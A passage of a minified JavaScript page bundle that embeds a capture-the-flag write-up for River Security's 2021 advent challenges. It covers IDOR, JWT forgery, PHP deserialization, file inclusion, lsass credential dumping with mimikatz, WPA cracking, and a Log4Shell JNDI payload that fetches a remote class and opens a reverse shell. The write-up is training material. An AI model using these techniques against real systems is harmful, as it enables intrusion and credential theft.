`),ea=e("a"),Zf=i("https://rsxc.no/af00ef8611422bdcd1606f51a55ccbccf16c6ac56a1bea01e4e725dae506aaf0/06-challenge.txt"),jc=u(),Rs=e("h3"),mt=e("a"),Jf=i("Solution"),Pc=u(),N=e("p"),jf=i("As this is an old cipher challenge, I could guess that the cipher will for most part be insecure and that there is also a high change that there already exist online decoders out there in the Internet for that specific cipher. Knowing this I began by identifying the cipher using "),ta=e("a"),Pf=i("dcode\u2019s cipher identification tool"),Hf=i(". The result from that tool gave me the cipher "),Pp=e("code"),Af=i("vig\xE8nere cipher"),Xf=i(" as the highest probability. Following that I used the same site for decoding vigenere ciphertexts and found the flag on key "),Hp=e("code"),qf=i("YMZHG"),Gf=i(`:
`),bt=e("img"),Hc=u(),Us=e("p"),Bf=i("The flag is "),Ap=e("code"),$f=i("RSXC{isthisnotjustafancycaesarcipher}"),Ac=u(),Ns=e("h2"),gt=e("a"),Qf=i("[DAY 7] This is quite meta"),Xc=u(),Ws=e("h3"),vt=e("a"),Lf=i("Challenge"),qc=u(),_t=e("blockquote"),wt=e("p"),Kf=i(`We found this picture that seemed to contain the flag, but it seems like it has been cropped, are you able to help us retrieve the flag?
`),oa=e("a"),ad=i("https://rsxc.no/6c9161113dadfbb06d6865f9db5499bd701067c9d69c2452894a8fcf697d21d9/07-challenge.jpg"),Gc=u(),Ss=e("h3"),Et=e("a"),sd=i("Solution"),Bc=u(),Tt=e("p"),nd=i("We are given an image file that seems to have some parts of it missing. I guessed from the title that it has something to do with the metadata of the image. Having this in mind, I began to look at it using exiftools:"),$c=u(),Ms=e("pre"),Qc=u(),pa=e("p"),ed=i("Looking at the output, there seems to be some some binary data at the metadata \u201CThumbnail Image\u201D. Using "),la=e("a"),td=i("dcode\u2019s EXIF Thumbnail Extractor tool"),od=i(` I try to extract the thumbnail image hoping that the saved thumbnail of the image is of the uncropped and full image, thus also finding the whole flag:
`),yt=e("img"),Lc=u(),Is=e("p"),pd=i("The flag is: "),Xp=e("code"),ld=i("RSXC{Sometimes_metadata_hides_stuff}"),Kc=u(),Os=e("h2"),Vt=e("a"),id=i("[DAY 8] The reference"),ar=u(),Fs=e("h3"),xt=e("a"),cd=i("Challenge"),sr=u(),Rt=e("blockquote"),Ut=e("p"),rd=i(`I just created a new note saving application, there is still some improvements that can be made but I still decided to show it to you!
`),ia=e("a"),ud=i("http://rsxc.no:20008"),nr=u(),zs=e("h3"),Nt=e("a"),kd=i("Solution"),er=u(),V=e("p"),hd=i("We are given a link to a page with different notes saved. Out of all the notes we see that, Note 2, Note 3 and Note 4 are available for us. Opening any of the note directs us to a php site with the GET request "),qp=e("code"),fd=i("id"),dd=i(" of that note number: "),Gp=e("code"),md=i("http://rsxc.no:20008/notes.php?id=2"),bd=i(". By directly changing the value of "),Bp=e("code"),gd=i("id"),vd=i(" and the url to "),$p=e("code"),_d=i("http://rsxc.no:20008/notes.php?id=0"),wd=i(" we receive the flag."),tr=u(),Cs=e("p"),Ed=i("The flag is: "),Qp=e("code"),Td=i("RSXC{Remember_to_secure_your_direct_object_references}"),or=u(),Ds=e("h2"),Wt=e("a"),yd=i("[DAY 9] The reference 2"),pr=u(),Ys=e("h3"),St=e("a"),Vd=i("Challenge"),lr=u(),Mt=e("blockquote"),It=e("p"),xd=i(`I see that someone managed to read my personal notes yesterday, so I have improved the security! Good luck!
`),ca=e("a"),Rd=i("http://rsxc.no:20009"),ir=u(),Zs=e("h3"),Ot=e("a"),Ud=i("Solution"),cr=u(),C=e("p"),Nd=i("Navigating to the site shows something that looks quite similar to the last challenge, but with a more secured referencing as it is encoded in some way. Reading the different notes available to us gave us the keywords and hints of: "),Lp=e("code"),Wd=i("RFC 1321"),Sd=i(" and"),Kp=e("code"),Md=i("MD5"),Id=i(`, thus hinting to the used algorithm the note ids are encoded/hashed with. To confirm this, I checked the different id from the available notes on crackstation, and it is indeed true:
`),Ft=e("img"),rr=u(),zt=e("p"),Od=i("Knowing the naming convention and the hash algorithm used for the note id, I could easily craft my own for \u201Cnote0\u201D:"),ur=u(),Js=e("pre"),kr=u(),P=e("p"),Fd=i("Navigating to the note with that id ("),ra=e("a"),zd=i("http://rsxc.no:20009/notes.php?id=65b29a77142a5c237d7b21c005b72157"),Cd=i(") did however not give us the flag directly, and instead tells us that the note with the flag has the id of the md5 hash of the word "),al=e("code"),Dd=i("flag"),Yd=i(". Doing the same steps as above and navigating to the note using this new note id gives us the flag:"),hr=u(),js=e("pre"),fr=u(),Ps=e("p"),Zd=i("The flag is: "),sl=e("code"),Jd=i("RSXC{MD5_should_not_be_used_for_security.Especially_not_with_known_plaintext}"),dr=u(),Hs=e("h2"),Ct=e("a"),jd=i("[DAY 10] Lookup"),mr=u(),As=e("h3"),Dt=e("a"),Pd=i("Challenge"),br=u(),Yt=e("blockquote"),Zt=e("p"),Hd=i(`Sometimes you need to look up to get the answer you need.
`),ua=e("a"),Ad=i("http://rsxc.no:20010"),gr=u(),Xs=e("h3"),Jt=e("a"),Xd=i("Solution"),vr=u(),H=e("p"),qd=i("Navigating to the page we see an input field telling us to \u201Clookup\u201D. After fuzzing for quite some time, I guessed that it could be something about DNS lookup as the title was hinting for it. However, running "),nl=e("code"),Gd=i("dig"),Bd=i(", "),el=e("code"),$d=i("nslookup"),Qd=i(" and so on didn\u2019t give me any useful results. After a while on a lucky guess I curl\u2019ed the url along with the headers thinking that there might be some useful request headers I might have overlooked, and there it is. The flag was included as a header:"),_r=u(),qs=e("pre"),wr=u(),Gs=e("p"),Ld=i("The flag is: "),tl=e("code"),Kd=i("RSXC{Sometimes_headers_can_tell_you_something_useful}"),Er=u(),Bs=e("h2"),jt=e("a"),am=i("[DAY 11] The not so random prime"),Tr=u(),$s=e("h3"),Pt=e("a"),sm=i("Challenge"),yr=u(),Ht=e("blockquote"),At=e("p"),nm=i(`We intercepted some traffic from a malicious actor. They seemed to be using a not so secure implementation of RSA, could you help us figure out how they did it?
`),ka=e("a"),em=i("https://rsxc.no/af6c1a2345b4de89831605d6c9cd9307b6b54df0bd6bd8c506317277119457e8/11-challenge.zip"),Vr=u(),Qs=e("h3"),Xt=e("a"),tm=i("Solution"),xr=u(),Fa=e("p"),om=i("We are given a rsa encryption script and it\u2019s output. Observing the code, we can first see that there\u2019s something strange with the prime generation. The problem is that it doesn\u2019t generate two independent random primes as an RSA encryption scheme should. Instead it generates an independent random prime number p (with 1023 or 1024 bits), then a random prime q obtained by the line: "),ol=e("code"),pm=i("q = nextprime(p * p)"),lm=i(" (meaning that q is generated with dependent on p)."),Rr=u(),A=e("p"),im=i("Knowing this, we know that N is approximately "),pl=e("code"),cm=i("p^3"),rm=i(", and taking the cuberoot of N, we can get the approximate for p. Knowing the approximate p or the exact p itself we can easily find "),ll=e("code"),um=i("q"),km=i(" and then decrypt everything. A quick python script can be seen below:"),Ur=u(),Ls=e("pre"),Nr=u(),Ks=e("p"),hm=i("The flag is: "),il=e("code"),fm=i("RSXC{Good_Job!I_see_you_know_how_to_do_some_math_and_how_rsa_works}"),Wr=u(),an=e("h2"),qt=e("a"),dm=i("[DAY 12] Twelve seconds of encoding"),Sr=u(),sn=e("h3"),Gt=e("a"),mm=i("Challenge"),Mr=u(),Bt=e("blockquote"),cl=e("p"),bm=i(`For this challenge you need to do some encoding, but remember, you need to do it quickly, before the time runs out.
rsxc.no:20012`),Ir=u(),nn=e("h3"),$t=e("a"),gm=i("Solution"),Or=u(),Qt=e("p"),vm=i("We are given an address to connect to, connecting to it prompts us to solve 100 different encoding and string manipulation tasks in under 12 seconds. As this is probably not possible to do manually by hand, I opted to solve this using python and pwntools. A quick and dirty code for the solution can be seen below:"),Fr=u(),en=e("pre"),zr=u(),tn=e("p"),_m=i("The flag is: "),rl=e("code"),wm=i("RSXC{Seems_like_you_have_a_knack_for_encoding_and_talking_to_servers!}"),Cr=u(),on=e("h2"),Lt=e("a"),Em=i("[DAY 13] New technology is hard"),Dr=u(),pn=e("h3"),Kt=e("a"),Tm=i("Challenge"),Yr=u(),ao=e("blockquote"),so=e("p"),ym=i(`When starting with new languages and frameworks, it is easy to get confused, and do things you shouldn\u2019t.
`),ha=e("a"),Vm=i("http://rsxc.no:20013"),Zr=u(),ln=e("h3"),no=e("a"),xm=i("Solution"),Jr=u(),za=e("p"),Rm=i("Navigating to the site, we are greeted with a basic beginner todo list example in React. However just as the description says, the user seemed to have published the project in development mode and not in production. This means that the source code of the page could be seen. Looking through the source code, we see a base64 string at the file "),ul=e("code"),Um=i("Todos.js"),Nm=i("."),jr=u(),cn=e("pre"),Pr=u(),eo=e("p"),Wm=i("Decrypting it gives us the flag:"),Hr=u(),rn=e("pre"),Ar=u(),un=e("p"),Sm=i("The flag is: "),kl=e("code"),Mm=i("RSXC{it_might_be_there_even_if_you_don't_include_it!}"),Xr=u(),kn=e("h2"),to=e("a"),Im=i("[DAY 14] JWT"),qr=u(),hn=e("h3"),oo=e("a"),Om=i("Challenge"),Gr=u(),po=e("blockquote"),lo=e("p"),Fm=i(`Have you heard about the secure information sharing standard JWT? It can sometimes be a little confusing, but I think we got it all figured out.
`),fa=e("a"),zm=i("http://rsxc.no:20014"),Br=u(),fn=e("h3"),io=e("a"),Cm=i("Solution"),$r=u(),da=e("p"),Dm=i("Looking at the title of the challenge I can guess that this challenge is about a wrong implementation of JSON Web Tokens, an industry standard RFC 7519 method for representing claims securely between two parties. Following the guides from "),ma=e("a"),Ym=i("hacktricks"),Zm=i(` of different ways a JWT can be exploited. I begin to test the exploit of changing the algorithm RS256(asymmetric) to HS256(symmetric), since we had public key given to us. If the backend is implemented without checking for a specific algorithm, the back end code will then use the public key to both sign and verify the signature, meaning that we can easily manipulate and sign our own token. This was done using the site jwt.io:
`),co=e("img"),Qr=u(),ro=e("p"),Jm=i("Navigating to the page with our new and tampered JWT cookie gives us the flag:"),Lr=u(),dn=e("pre"),Kr=u(),mn=e("p"),jm=i("The flag is: "),hl=e("code"),Pm=i("RSXC{You_have_to_remember_to_limit_what_algorithms_are_allowed}"),au=u(),bn=e("h2"),uo=e("a"),Hm=i("[DAY 15] JWT 2"),su=u(),gn=e("h3"),ko=e("a"),Am=i("Challenge"),nu=u(),ho=e("blockquote"),fo=e("p"),Xm=i(`I can admit I might not have figured out everything, but I think everything should be figured out now! I have however implemented a new header I found in RFC 7515.
`),ba=e("a"),qm=i("http://rsxc.no:20015"),eu=u(),vn=e("h3"),mo=e("a"),Gm=i("Solution"),tu=u(),h=e("p"),Bm=i("This challenge seemed to be the same as day 15 but with just "),fl=e("code"),$m=i("kid"),Qm=i("-issues added. "),dl=e("code"),Lm=i("kid"),Km=i(" is an optional header claim which holds a key identifier, useful when we have multiple keys to sign the tokens and need to look up the right one to verify the signature. However, we can from this knowledge, utilize it as a type of path traversal giving either an error if the file exists or not. If the "),ml=e("code"),a1=i("kid"),s1=i(" file path check is used within php functions such as "),bl=e("code"),n1=i("include"),e1=i(" or "),gl=e("code"),t1=i("file_get_content"),o1=i(" one could also inject the data in, reading the source. After much trial and error using the well known python "),ga=e("a"),p1=i("jwt_tool"),l1=i(" for tampering with the token, we find that setting the "),vl=e("code"),i1=i("kid"),c1=i(" value to a php file from the website will print out the data in plaintext for us. Knowing this, I set the "),_l=e("code"),r1=i("kid"),u1=i(" value to "),wl=e("code"),k1=i("portal.php"),h1=i(" (the page responsible for checking and authing the JWT token). Using that tampered token on navigation did give us the flag:"),ou=u(),_n=e("pre"),pu=u(),wn=e("pre"),lu=u(),En=e("p"),f1=i("The flag is: "),El=e("code"),d1=i("RSXC{Don't_let_others_decide_where_your_keys_are_located}"),iu=u(),Tn=e("h2"),bo=e("a"),m1=i("[DAY 16] A scary command"),cu=u(),yn=e("h3"),go=e("a"),b1=i("Challenge"),ru=u(),vo=e("blockquote"),_o=e("p"),g1=i(`Sometimes while monitoring networks and machines, or doing incident response, we find some obfuscated commands. We didn\u2019t have time to deobfuscate this, and it is not recommended to just run it. Could you help us with it?
`),va=e("a"),v1=i("https://rsxc.no/dfb61488866658d31e3e7ccd2287caf233108a7eb917da6aefde3792d0fd79d2/16-challenge.sh"),uu=u(),Vn=e("h3"),wo=e("a"),_1=i("Solution"),ku=u(),Ca=e("p"),w1=i("Downloading the shell file, we see some obfuscated bash scripting. Running this blindly is probably not a good idea as just as the title says, it might be a scary command. What I began to do in order to reverse this obfuscation is to comment out the "),Tl=e("code"),E1=i("eval"),T1=i(" commands and swapping it with echo, seen below. Running this following script outputs some further steps to do:"),hu=u(),xn=e("pre"),fu=u(),Rn=e("pre"),du=u(),Da=e("p"),y1=i("Running this command output, we see something that resembles the source code of the bash script we just ran. But the variable "),yl=e("code"),V1=i("s"),x1=i(" seemed to have changed."),mu=u(),Un=e("pre"),bu=u(),Ya=e("p"),R1=i("Further I piped this bash output into a new file "),Vl=e("code"),U1=i("16-challenge2.sh"),N1=i(", adding the neccessary edits and modifications to safely run the code:"),gu=u(),Nn=e("pre"),vu=u(),Eo=e("p"),W1=i("Running this script gave somewhat similar output as before, however when executing the output command we get something quite new:"),_u=u(),Wn=e("pre"),wu=u(),X=e("p"),S1=i("Looking like we\u2019re nearing the final steps as there is some commands piped into "),xl=e("code"),M1=i("sh"),I1=i(", I write the output into the final bash file "),Rl=e("code"),O1=i("16-challenge3.sh"),F1=i(" with some minor changes once again:"),Eu=u(),Sn=e("pre"),Tu=u(),W=e("p"),z1=i("Running this bash script gave a completely different output with a quite large hexadecimal piped into "),Ul=e("code"),C1=i("xxd"),D1=i(" and then "),Nl=e("code"),Y1=i("sh"),Z1=i(" for execution. Further running this command directly without executing ("),Wl=e("code"),J1=i("| sh"),j1=i(") gives:"),yu=u(),Mn=e("pre"),Vu=u(),To=e("p"),P1=i("The output seemed to be a navigation to the an url containing the flag, but opening the page gives us a 404 Not Found response. However, looking at the comments after the curl command we see some strings looking similar to an base64 encoded string. Decoding the comment gives us the flag:"),xu=u(),In=e("pre"),Ru=u(),On=e("p"),H1=i("The flag is: "),Sl=e("code"),A1=i("RSXC{Don't_blindly_trust_obfuscated_code_it_might_do_something_bad}"),Uu=u(),Fn=e("h2"),yo=e("a"),X1=i("[DAY 17] My XMas card"),Nu=u(),zn=e("h3"),Vo=e("a"),q1=i("Challenge"),Wu=u(),xo=e("blockquote"),Ro=e("p"),G1=i(`We felt like it\u2019s time to start sending out some XMas cards, maybe you find something you like?
`),_a=e("a"),B1=i("http://rsxc.no:20017"),Su=u(),Cn=e("h3"),Uo=e("a"),$1=i("Solution"),Mu=u(),m=e("p"),Q1=i("Navigating to the page we are greeted with a Xmas card along with the lines of \u201CFinding your card in /files\u201D. This hint tells us that there exists a directory/path to "),Ml=e("code"),L1=i("/files"),K1=i(". Going to that said directory, we can see that there are 3 files: "),Il=e("code"),a2=i("card.txt"),s2=i(", "),Ol=e("code"),n2=i("index.php-1"),e2=i(" and "),Fl=e("code"),t2=i("flag.txt"),o2=i(". Guessing that the flag is in the "),zl=e("code"),p2=i("flag.txt"),l2=i(" file, I get a forbidden error on opening it as I don\u2019t have permission to access the resource. Looking at all the other files we see that the content of "),Cl=e("code"),i2=i("card.txt"),c2=i(" is loaded and read at "),Dl=e("code"),r2=i("index.php"),u2=i(", and the source code could be seen in "),Yl=e("code"),k2=i("index.php-1"),h2=i(":"),Iu=u(),Dn=e("pre"),Ou=u(),S=e("p"),f2=i("Looking at the source code we can see that this challenge is about PHP Deserialization/Object Injection. By sending in an arbitrary base64 serialized "),Zl=e("code"),d2=i("Card"),m2=i(" object to the GET request input, the object is constructed and the method "),Jl=e("code"),b2=i("displayCard()"),g2=i(" is run. Knowing the vulnerability, solving the challenge has become as easy as creating my own class of "),jl=e("code"),v2=i("Card"),_2=i(" and then serializing it:"),Fu=u(),Yn=e("pre"),zu=u(),Zn=e("pre"),Cu=u(),Jn=e("p"),w2=i("The flag is: "),Pl=e("code"),E2=i("RSXC{Care_needs_to_be_taken_with_user_supplied_input.It_should_never_be_trusted}"),Du=u(),jn=e("h2"),No=e("a"),T2=i("[DAY 18] Remember the flag? Docker remembers"),Yu=u(),Pn=e("h3"),Wo=e("a"),y2=i("Challenge"),Zu=u(),So=e("blockquote"),Mo=e("p"),V2=i(`We found a docker image, but it seems that the flag has been removed from it, could you help us get it back?
`),wa=e("a"),x2=i("https://rsxc.no/798d1de7d544fe090786f5930d137b863ff46dd19a018882ed2812a835517d1b/18-challenge.zip"),Ju=u(),Hn=e("h3"),Io=e("a"),R2=i("Solution"),ju=u(),Za=e("p"),U2=i("We are given a zip file containing a docker image. Usually what one would start with a challenge similar like this is to analyze the different commands and files found in dockerfile and container. However, after unzipping it and just simply running "),Hl=e("code"),N2=i("strings"),W2=i(" and greping for the flag on the uncompressed file gives us the flag in plaintext\u2026 Sometimes, solving a challenge can be as easy as just that."),Pu=u(),An=e("pre"),Hu=u(),Xn=e("p"),S2=i("The flag is: "),Al=e("code"),M2=i("RSXC{Now_you_know_that_docker_images_are_like_onions.They_have_many_layers}"),Au=u(),qn=e("h2"),Oo=e("a"),I2=i("[DAY 19] The inclusive xmas cards"),Xu=u(),Gn=e("h3"),Fo=e("a"),O2=i("Challenge"),qu=u(),zo=e("blockquote"),Co=e("p"),F2=i(`We felt that the our last xmas cards weren\u2019t that inclusive. So we made even more options, so everyone has one that fits them!
`),Ea=e("a"),z2=i("http://rsxc.no:20019"),Gu=u(),Bn=e("h3"),Do=e("a"),C2=i("Solution"),Bu=u(),g=e("p"),D2=i("Similar to the challenge from day 17, we are greeted with a page containing different xmas cards after navigting to the website. However, different from the previous challenge, there is no source code to be found at the directory "),Xl=e("code"),Y2=i("/files"),Z2=i(". The only text files we could see was "),ql=e("code"),J2=i("flag.txt"),j2=i(", "),Gl=e("code"),P2=i("santa.txt"),H2=i(", "),Bl=e("code"),A2=i("snowmen.txt"),X2=i(" and "),$l=e("code"),q2=i("tree.txt"),G2=i(". Again, we don\u2019t have permission to open "),Ql=e("code"),B2=i("flag.txt"),$2=i(" just as last time."),$u=u(),E=e("p"),Q2=i("Testing the application and opening the "),Ll=e("code"),L2=i("xmas tree"),K2=i(" card for instance, we see that we are directed to the url: "),Kl=e("code"),ab=i("http://rsxc.no:20019/card.php?card=dHJlZS50eHQ="),sb=i(", the same php file "),ai=e("code"),nb=i("card.php"),eb=i(" as last time with the GET request of "),si=e("code"),tb=i("?card=dHJlZS50eHQ="),ob=i(". This time, the GET requests seems to be something that resembles a base64 encoded string. After trying to decode the base64, I could guess how the challenge could be solved as the encryption is just base64\u2019ing the desired file input at the directory "),ni=e("code"),pb=i("/files"),lb=i("."),Qu=u(),$n=e("pre"),Lu=u(),q=e("p"),ib=i("Since we can control the GET request input of "),ei=e("code"),cb=i("card"),rb=i(", reading the flag is as easy as requesting for the file "),ti=e("code"),ub=i("flag.txt"),kb=i(" encoded in base64:"),Ku=u(),Qn=e("pre"),ak=u(),Ln=e("p"),hb=i("The flag is: "),oi=e("code"),fb=i("RSXC{It_is_not_smart_to_let_people_include_whatever_they_want}"),sk=u(),Kn=e("h2"),Yo=e("a"),db=i("[DAY 20] Easy mistakes"),nk=u(),ae=e("h3"),Zo=e("a"),mb=i("Challenge"),ek=u(),Jo=e("blockquote"),jo=e("p"),bb=i(`When programming, it is easy to make simple mistakes, and some of them can have dire consequences.
`),Ta=e("a"),gb=i("http://rsxc.no:20020"),tk=u(),se=e("h3"),Po=e("a"),vb=i("Solution"),ok=u(),Ho=e("p"),_b=i("Upon navigating to the site we are greeted with the source code of the challenge:"),pk=u(),ne=e("pre"),lk=u(),T=e("p"),wb=i("Looking at the code we can see that the api path takes in two inputs as JSON body requests, "),pi=e("code"),Eb=i("hmac"),Tb=i(" and "),li=e("code"),yb=i("host"),Vb=i(". Upon receiving the correct body input, it signs the "),ii=e("code"),xb=i("host"),Rb=i(" input with a secret using the hashing algorithm "),ci=e("code"),Ub=i("sha256"),Nb=i(" and comparing the result with the "),ri=e("code"),Wb=i("hmac"),Sb=i(" input. The flag is then outputted if these two values compared are the same. However, what the application did not take into consideration is that we have control over both the unsigned value that is to be signed, and the result of the signed. This means that sending in an empty value/string on both inputs, ie. signing an empty message results in an empty message, would give us the flag:"),ik=u(),ee=e("pre"),ck=u(),te=e("p"),Mb=i("The flag is: "),ui=e("code"),Ib=i("RSXC{You_have_to_have_the_right_order_for_arguments!}"),rk=u(),oe=e("h2"),Ao=e("a"),Ob=i("[DAY 21] Nice memories"),uk=u(),pe=e("h3"),Xo=e("a"),Fb=i("Challenge"),kk=u(),qo=e("blockquote"),Go=e("p"),zb=i(`Note: The flag is the clear text password for river-security-xmas user.
On a IR mission we found that the threatactor dumped lsass file.
Can you rock our world and find the flag for us?
`),ya=e("a"),Cb=i("https://rsxc.no/35a2c6961adc6886665363b6f47c3a156356a91a4cf602416b250aa4daca4167/21-challenge.zip"),hk=u(),le=e("h3"),Bo=e("a"),Db=i("Solution"),fk=u(),G=e("p"),Yb=i("We are given a system dump of the lsass file. To make it easier for myself, as this was a Windows dump, I opted to use mimikatz on my Windows PC to dump the passwords from the memory dump file "),ki=e("code"),Zb=i("lsass.DMP"),Jb=i(" instead of my usual linux setup "),hi=e("em"),jb=i("(this is due to not having an instance of kali linux ready)"),Pb=i("."),dk=u(),ie=e("pre"),mk=u(),y=e("p"),Hb=i("After getting the NTLM hash ("),fi=e("code"),Ab=i("7801ee9c5762bb027ee224d54cb8f62e"),Xb=i(") of the password for the user "),di=e("code"),qb=i("river-security-xmas"),Gb=i(" through mimikatz. With the hint of "),mi=e("code"),Bb=i("Can you rock our world and find the flag for us?"),$b=i(", hinting to the use of "),bi=e("code"),Qb=i("rockyou.txt"),Lb=i(", I bruteforced the password of this hash using "),gi=e("code"),Kb=i("john-the-ripper"),a0=i(" (a password cracking tool running on the CPU):"),bk=u(),ce=e("pre"),gk=u(),re=e("p"),s0=i("The flag is: "),vi=e("code"),n0=i("alliwantforchristmasisyou"),vk=u(),ue=e("h2"),$o=e("a"),e0=i("[DAY 22] Wireless communication"),_k=u(),ke=e("h3"),Qo=e("a"),t0=i("Challenge"),wk=u(),Lo=e("blockquote"),_i=e("p"),o0=i(`We tried to find a new way of sending the flag, and this time it is even encrypted! Since we are nice we will even give you a hint. The password starts with S. Can you Rock our world?
https:///rsxc.no/5512383c4c02768617233eefdd4f79efe5dea9d08a850c8414644abf296845cf/22-challenge.cap`),Ek=u(),he=e("h3"),Ko=e("a"),p0=i("Solution"),Tk=u(),v=e("p"),l0=i("We are given a pcap file containing some WPA network sniffed packet. Along with the hint of "),wi=e("code"),i0=i('"Can you Rock our world?"'),c0=i(", hinting to the usage of "),Ei=e("code"),r0=i("rockyou.txt"),u0=i(". I guessed we could recover or bruteforce the password starting with an "),Ti=e("code"),k0=i("S"),h0=i(" for this network for us to read the encrypted data. Since I didn\u2019t have any computer with GPU on hand, bruteforcing with a tool running with CPU such as "),yi=e("code"),f0=i("john-the-ripper"),d0=i(" or "),Vi=e("code"),m0=i("aircrack-nk"),b0=i(" was the only choice. I chose to go with the latter, "),xi=e("code"),g0=i("aircrack-ng"),v0=i(" (an 802.11 WEP and WPA/WPA2-PSK key cracking program), for this job."),yk=u(),Ja=e("p"),_0=i("In order to make the bruteforcing a lot faster, I narrowed down the wordlist of rockyou by filtering out the passwords starting with an uppercase "),Ri=e("code"),w0=i("S"),E0=i(" through a quick python script:"),Vk=u(),fe=e("pre"),xk=u(),ap=e("p"),T0=i("After having filtered out and produced a smaller wordlist, retrieving the password of the network is just as simple as running the following command:"),Rk=u(),de=e("pre"),Uk=u(),ja=e("p"),y0=i("The password we retrieved is: "),Ui=e("code"),V0=i("Santaclaws99"),x0=i("."),Nk=u(),D=e("p"),R0=i(`In order to read the encoded pcap network data in wireshark now, we have to add in the password of the network as the decryption key. This can be done in preferences:
`),Ni=e("code"),U0=i("Edit > Preferences\u2026 > Protocols > IEEE 802.11 > Decription keys > Edit"),N0=u(),sp=e("img"),W0=u(),np=e("img"),Wk=u(),me=e("p"),S0=i(`Adding the password, we can now see some TCP packets being sent. The flag is found after following that said TCP packet.
`),ep=e("img"),Sk=u(),be=e("p"),M0=i("The flag is: "),Wi=e("code"),I0=i("RSXC{WIFI_is_fun}"),Mk=u(),ge=e("h2"),tp=e("a"),O0=i("[DAY 23] Locating the location"),Ik=u(),ve=e("h3"),op=e("a"),F0=i("Challenge"),Ok=u(),pp=e("blockquote"),lp=e("p"),z0=i(`We seem to have lost a file, can you please help us find it?
`),Va=e("a"),C0=i("http://rsxc.no:20023"),Fk=u(),_e=e("h3"),ip=e("a"),D0=i("Solution"),zk=u(),B=e("p"),Y0=i("Upon navigating to the site, we are greeted with a text saying that a "),Si=e("code"),Z0=i("flag.txt"),J0=i(" file was lost in a subfolder on the server hosting the site. The directory name is said to also be found in dirb\u2019s "),Mi=e("code"),j0=i("small.txt"),P0=i(" wordlist, and that the functionality of directory listing is not enabled, meaning we will receive a status code of 200 whatever directory we search for."),Ck=u(),$=e("p"),H0=i("From this I could guess that this challenge was of content discovery and directory bruteforcing, and was thus the approach I began to try. Knowing that the directory listing is not enabled, I knew that I couldn\u2019t run the wordlist as it is, but have to somehow manipulate it by directly searching for the file "),Ii=e("code"),A0=i("flag.txt"),X0=i(". This was done by modifying the wordlist a little by appending the path "),Oi=e("code"),q0=i("/flag.txt"),G0=i(" to every line in the wordlist. A quick python script for this can be seen here:"),Dk=u(),we=e("pre"),Yk=u(),Pa=e("p"),B0=i("Running "),Fi=e("code"),$0=i("gobuster"),Q0=i(", a directory bruteforcing tool, on the modified wordlist and then outputting the results of the body length (response length) to a file, I can search for the flag as a response with a response length different from the others:"),Zk=u(),Ee=e("pre"),Jk=u(),Te=e("p"),L0=i("The flag is: "),zi=e("code"),K0=i("RSXC{Content_discovery_is_a_useful_to_know.Good_job_finding_the_flag}"),jk=u(),ye=e("h2"),cp=e("a"),ag=i("[DAY 24] The watcher"),Pk=u(),Ve=e("h3"),rp=e("a"),sg=i("Challenge"),Hk=u(),up=e("blockquote"),kp=e("p"),ng=i(`We have found a service that watches our every step, are you able to figure out how we can read the FLAG from the environment? NB. Container will be restarted every 30 minutes.
`),xa=e("a"),eg=i("http://rsxc.no:20024"),Ak=u(),xe=e("h3"),hp=e("a"),tg=i("Solution"),Xk=u(),_=e("p"),og=i("Looking at the challenge description I could guess from the get go that it was going to be about the new vulnerability known as Log4Shell ("),Ci=e("code"),pg=i("CVE-2021-44228"),lg=i(") affecting the Java logging package "),Di=e("code"),ig=i("log4j"),cg=i(". To confirm this, navigating to the site, we are greeted with the sentence of "),Yi=e("code"),rg=i("Be careful, I'm logging everything..."),ug=i(" hinting to some form of "),Zi=e("code"),kg=i("logging"),hg=i(". Fuzzing for some directories such as "),Ji=e("code"),fg=i("http://rsxc.no:20024/test"),dg=i(" for instance, results in a "),ji=e("code"),mg=i("Whitelabel Error Page"),bg=i(" due to not having set up a dedicated error page yet. Googling this tells us that we are indeed working with a Java web application, running on Spring Boot:"),qk=u(),fp=e("blockquote"),Pi=e("p"),gg=i("WhiteLabel Error Page is a generic Spring Boot error page that is displayed when no custom error page is present."),Gk=u(),Ha=e("p"),vg=i("Using the site "),Ra=e("a"),_g=i("https://log4j-tester.trendmicro.com/"),wg=i(" I can test for locations suitable for the JNDI attack vector, and further finds that most of the user-supplied data and headers could actually be exploited as \u201Ceverything is being logged\u201D. For this case, I used the User-Agent header. To further test this for ourselves, preparing a netcat listener, and then curl\u2019ing the site with the JNDI payload results in a connection:"),Bk=u(),Re=e("pre"),$k=u(),Ue=e("pre"),Qk=u(),dp=e("p"),Eg=i("The site is indeed confirmed to be vulnerable to Log4Shell!"),Lk=u(),mp=e("p"),Tg=i("To exploiting the server, I setup my attack chain like so:"),Kk=u(),Y=e("ol"),Ne=e("li"),yg=i("Begin with a payload of "),Hi=e("code"),Vg=i("${jndi:ldap://localhost:1389/Exploit}"),xg=i(" that reaches our LDAP Referral Server"),Rg=u(),Ai=e("li"),Ug=i("Our LDAP Referral Server then forwards the request to a secondary HTTP server http://localhost:8000/Exploit.class"),Ng=u(),Xi=e("li"),Wg=i("The victim server will then retrieve and execute the code present in http://localhost:8000/Exploit.class, making it possible to run arbitrary code and command we send in"),ah=u(),Q=e("p"),Sg=i("Utilizing both the tool localtunnel ("),qi=e("code"),Mg=i("lt -port 8000"),Ig=i(") and ngrok ("),Gi=e("code"),Og=i("ngrok tcp 1389"),Fg=i("), I can expose my localhost connection to the Internet freely using two computers hosting the local servers for the attack. The following tunnel forwarding is in this case, as such:"),sh=u(),We=e("pre"),nh=u(),Aa=e("p"),zg=i("First, with the "),Ua=e("a"),Cg=i("marshalsec utility"),Dg=i(", I start my LDAP referral server to direct connections to my secondary HTTP server:"),eh=u(),Se=e("pre"),th=u(),bp=e("p"),Yg=i("Following that I set up the HTTP server, and also start the netcat listener on the other computer:"),oh=u(),Me=e("pre"),ph=u(),Ie=e("pre"),lh=u(),Xa=e("p"),Zg=i("Having all the servers correctly up and running, the finishing touches for the attack payload would be to fix up the code for the exploit ("),Bi=e("code"),Jg=i("Exploit.class"),jg=i(") and then running a curl to the server with our attack payload. A exploit code solution for a reverse shell can be seen below:"),ih=u(),Oe=e("pre"),ch=u(),gp=e("p"),Pg=i("Having everything ready and set up, we run our attack:"),rh=u(),Fe=e("pre"),uh=u(),qa=e("p"),Hg=i("Upon running the two commands above, we receive a reverse shell on our netcat listener and can freely "),$i=e("code"),Ag=i("cat"),Xg=i(" the flag:"),kh=u(),ze=e("pre"),hh=u(),Ce=e("p"),qg=i("The flag is: "),Qi=e("code"),Gg=i("RSXC{We_do_like_logging_right?}"),this.h()},l(a){f=t(a,"P",{});var p=o(f);Z=c(p,"Here is Shirajuki\u2019s write-up of the challenges of the company River Security\u2019s capture the flag advent calendar for 2021, 